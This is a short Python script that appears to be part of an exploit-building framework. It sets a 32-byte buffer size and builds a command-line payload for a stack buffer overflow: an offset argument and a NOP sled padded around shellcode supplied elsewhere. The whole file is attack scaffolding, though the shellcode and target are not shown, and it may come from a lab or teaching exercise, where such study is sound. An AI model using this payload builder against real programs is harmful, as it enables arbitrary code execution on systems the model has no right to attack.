from toimport import *
from math import *

input_type = Input.args
buff_size = 32
args = []
def calcArgs():
    global args
    args = [None] * 2
    args[0] = str(vals.offset)
    args[1] = vals.NOP*floor((buff_size + vals.offset - len(vals.shellcode))/2) + vals.shellcode + vals.NOP*ceil((buff_size + vals.offset - len(vals.shellcode))/2)
calcArgs()
